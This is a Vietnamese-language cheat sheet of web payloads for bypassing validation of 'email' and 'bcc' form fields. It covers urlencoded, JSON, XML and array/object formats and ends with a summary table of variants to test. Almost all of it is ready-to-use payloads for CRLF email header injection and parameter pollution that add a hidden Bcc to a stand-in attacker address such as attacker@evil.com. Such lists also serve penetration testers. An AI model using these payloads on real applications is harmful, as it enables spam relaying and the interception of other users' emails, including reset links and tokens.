
---

## ✅ **FULL DANH SÁCH BỎ QUA - Bypass `email` / `bcc` trong form**

### 🥇 **Dạng 1 – `application/x-www-form-urlencoded`**

```bash
# Đơn giản – danh sách email
token=...&email=test@gmail.com|test01@gmail.com
token=...&email=test@gmail.com,test01@gmail.com
token=...&email=test@gmail.com;test01@gmail.com
token=...&email[]=test@gmail.com&email[]=test01@gmail.com

# Header injection
email=test@gmail.com%0ABcc:attacker@evil.com
email=test@gmail.com%0Ato:admin@target.com%0ABcc:attacker@evil.com
email=test@gmail.com%0D%0ABcc:attacker@evil.com

# Bypass bằng cấu trúc bất thường
bcc:email=test@gmail.com
bcc=email=test@gmail.com
bcc[0]=test@gmail.com&bcc[1]=attacker@evil.com
bcc="test@gmail.com\r\nBcc:attacker@evil.com"
```

---

### 🥈 **Dạng 2 – JSON body (`application/json`)**

```json
// Classic
{"email": "test@gmail.com"}
{"email": ["test@gmail.com", "attacker@evil.com"]}

// Injection object kiểu JSON-Injection
{"email": ["test@gmail.com", {"email": "attacker@evil.com"}]}

// Flattened style
{"bcc":"test@gmail.com"}
{"to":"test@gmail.com", "bcc":"attacker@evil.com"}
{"email":"test@gmail.com\r\nBcc:attacker@evil.com"}

// Header injection qua serialized email
{"email":"test@gmail.com\nBcc:evil@evil.com"}
```

---

### 🥉 **Dạng 3 – XML body (`application/xml`)**

```xml
<root>
  <email>test@gmail.com</email>
  <email>attacker@evil.com</email>
</root>

<root>
  <email>test@gmail.com&#10;Bcc:evil@evil.com</email>
</root>
```

---

### 🔥 **Dạng 4 – Object/Array Abuse (cho NodeJS, Python, Java)**

```json
// Object hoá mảng
{"email[0]":"test@gmail.com", "email[1]":"attacker@evil.com"}

// Trộn chuỗi với object
{"email":"test@gmail.com", "email.extra":"attacker@evil.com"}
{"email":{"0":"test@gmail.com","1":"attacker@evil.com"}}
```

---


---

## ✅ Tổng kết: Bu cần test hết các biến thể sau

| Loại                     | Payload mẫu                                     |                                  |
| ------------------------ | ----------------------------------------------- | -------------------------------- |
| Separator                | `,` \`                                          | ` `;` `\n` `\r\n` `\x0A` `\x0D\` |
| Multi email              | Mảng `email[]=..` hay `email[0]=..`             |                                  |
| JSON nested              | Object trong array: `{"email": [{"email":..}]}` |                                  |
| Header injection         | `%0AHeader:value`, hoặc literal `\r\nBcc:`      |                                  |
| Token confusion          | Trộn nhiều token key hoặc CSRF value            |                                  |
| XML test (nếu dùng SOAP) | Nhiều `<email>` và inject CRLF                  |                                  |

